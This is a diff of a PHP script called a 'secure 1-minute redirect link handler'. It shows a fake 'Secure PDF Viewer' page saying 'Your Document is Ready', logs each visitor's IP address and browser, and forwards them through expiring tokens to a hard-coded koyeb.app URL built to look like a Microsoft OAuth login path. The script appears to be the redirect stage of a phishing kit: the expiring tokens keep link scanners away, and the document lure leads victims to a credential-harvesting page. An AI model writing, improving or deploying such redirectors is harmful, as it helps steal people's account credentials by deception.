@@ -1,19 +1,22 @@
 <?php
 // ==============================================
-// SECURE 1-MINUTE TEMPORARY LINK REDIRECT
+// SECURE 1-MINUTE REDIRECT LINK HANDLER
 // ==============================================
 
-error_reporting(0);
-ini_set('display_errors', 0);
+// Enable error reporting for debugging (disable in production)
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
 
 // ================= CONFIGURATION =================
 $config = [
-    'redirect_link' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/',
+    'redirect_url' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/', // <--- Change to your target URL
+    'temp_prefix' => 'temp_',           // Prefix for temp tokens
     'expire_seconds' => 60,
-    'redirect_delay' => 5
+    'log_file' => 'pdf_access.log',
+    'redirect_delay' => 1
 ];
 
-// ================= SECURITY CHECKS =================
+// Block CLI access
 if (php_sapi_name() === 'cli') {
     die("This script can only be accessed via web browser");
 }
@@ -28,35 +31,66 @@ function isTokenValid($token) {
     return (count($parts) === 2 && (time() - (int)$parts[1]) <= 60);
 }
 
-try {
-    if (isset($_GET['token'])) {
-        $token = $_GET['token'];
+function cleanExpiredFiles($prefix) {
+    $files = glob($prefix . '*');
+    foreach ($files as $file) {
+        if (filemtime($file) < time() - 120) {
+            @unlink($file);
+        }
+    }
+}
 
+// ================= REQUEST HANDLING =================
+try {
+    // Handle token-based redirect
+    if (isset($_GET['token'])) {
+        cleanExpiredFiles($config['temp_prefix']);
+        
+        $token = $_GET['token'];
+        
         if (!isTokenValid($token)) {
             throw new Exception("This link has expired after 1 minute");
         }
 
-        file_put_contents('access.log', sprintf(
-            "%s|ACCESSED|%s|%s\n",
+        $tempTokenFile = $config['temp_prefix'] . $token;
+        if (!file_exists($tempTokenFile)) {
+            throw new Exception("The temporary link is no longer available");
+        }
+
+        // Log successful access
+        file_put_contents($config['log_file'], sprintf(
+            "%s|REDIRECTED|%s|%s|%s|%s\n",
             date('Y-m-d H:i:s'),
             $_SERVER['REMOTE_ADDR'],
-            $token
+            $token,
+            $_SERVER['HTTP_REFERER'] ?? 'direct',
+            $_SERVER['HTTP_USER_AGENT']
         ), FILE_APPEND);
 
-        header("Location: {$config['redirect_link']}");
+        @unlink($tempTokenFile); // Clean after use
+        header("Location: " . $config['redirect_url']);
         exit;
     }
 
+    // ================= NEW REQUEST =================
     $token = generateToken();
-    $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') .
-                  $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
-    $redirectUrl = $current_url . '?token=' . urlencode($token);
+    $tempTokenFile = $config['temp_prefix'] . $token;
 
-    file_put_contents('access.log', sprintf(
-        "%s|GENERATED|%s|%s\n",
+    if (!@touch($tempTokenFile)) {
+        throw new Exception("System error: Could not generate token");
+    }
+
+    $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') .
+                   $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
+    $tempUrl = $current_url . '?token=' . urlencode($token);
+
+    // Log generation
+    file_put_contents($config['log_file'], sprintf(
+        "%s|GENERATED|%s|%s|%s\n",
         date('Y-m-d H:i:s'),
         $_SERVER['REMOTE_ADDR'],
-        $token
+        $token,
+        $_SERVER['HTTP_USER_AGENT']
     ), FILE_APPEND);
 
 } catch (Exception $e) {
@@ -70,91 +104,88 @@ try {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Redirecting...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure PDF Viewer</title>
+    <meta http-equiv="refresh" content="<?= $config['redirect_delay'] ?>;url=<?= htmlspecialchars($tempUrl) ?>">
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: #f0f0f0;
-            height: 100vh;
+            line-height: 1.6;
             margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            padding: 20px;
+            background-color: #f5f5f5;
+            color: #333;
         }
-        .top-bar {
-            position: fixed;
-            top: 0;
-            width: 100%;
-            background-color: #fff;
-            color: white;
-            padding: 10px;
-            text-align: center;
-            font-weight: bold;
-        }
-        .message-box {
-            background: #fff;
-            padding: 20px 30px;
-            box-shadow: 0 0 15px #322a76;
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
             border-radius: 8px;
-            text-align: center;
-            max-width: 400px;
-            opacity: 1;
-            animation: fadeIn 1s ease-in;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        .footer {
-            font-size: 0.8rem;
-            color: #888;
+        h1 {
+            color: #2c3e50;
+            margin-top: 0;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        .countdown {
+            font-size: 1.2em;
+            color: #e74c3c;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .url-box {
+            background: #f0f8ff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            word-break: break-all;
+            border-left: 4px solid #3498db;
+        }
+        .notice {
+            background: #fff8e1;
+            padding: 15px;
+            border-left: 4px solid #ffb300;
+            margin: 20px 0;
+        }
+        a {
+            color: #2980b9;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
+    <div class="container">
+        <h1>Your Document is Ready</h1>
+        
+        <div class="countdown">
+            Auto-redirecting in <span id="countdown"><?= $config['redirect_delay'] ?></span> second...
+        </div>
+        
+        <div class="url-box">
+            <strong>One-time access link:</strong><br>
+            <a href="<?= htmlspecialchars($tempUrl) ?>"><?= htmlspecialchars($tempUrl) ?></a>
+        </div>
+        
+        <div class="notice">
+            <strong>Note:</strong> This link will expire in 1 minute and can only be used once.
+            If you are not redirected automatically, please click the link above.
+        </div>
+    </div>
 
-<div class="top-bar" id="top-bar">Preparing Document...</div>
-
-<div class="message-box" id="message-box">
-    <h2 id="message">Hang tight! You will be redirected soon.</h2>
-    <p>This page will redirect automatically in <span id="countdown">5</span> seconds.</p>
-    <p class="footer">If not, <a href="<?php echo htmlspecialchars($config['redirect_link']); ?>">click here</a>.</p>
-</div>
-
-<script>
-    let countdown = 5;
-    const countdownEl = document.getElementById('countdown');
-    const message = document.getElementById('message');
-    const topBar = document.getElementById('top-bar');
-
-    // Countdown timer
-    const interval = setInterval(() => {
-        countdown--;
-        if (countdownEl) countdownEl.textContent = countdown;
-        if (countdown <= 0) clearInterval(interval);
-    }, 1000);
-
-    // Step 1: Preparing Document...
-    topBar.textContent = "Preparing Document...";
-
-    // Step 2: Your Document is Ready
-    setTimeout(() => {
-        topBar.textContent = "Your Document is Ready";
-        message.textContent = "Please wait while we redirect you...";
-    }, 2000);
-
-    // Step 3: Redirecting in Progress...
-    setTimeout(() => {
-        topBar.textContent = "Redirecting in Progress...";
-    }, 4000);
-
-    // Final: Redirect
-    setTimeout(() => {
-        window.location.href = "<?php echo htmlspecialchars($redirectUrl); ?>";
-    }, 5000);
-</script>
-
-
+    <script>
+        // Dynamic countdown display
+        let seconds = <?= $config['redirect_delay'] ?>;
+        function updateCountdown() {
+            document.getElementById('countdown').textContent = seconds;
+            if (seconds-- > 0) {
+                setTimeout(updateCountdown, 1000);
+            }
+        }
+        updateCountdown();
+    </script>
 </body>
 </html>
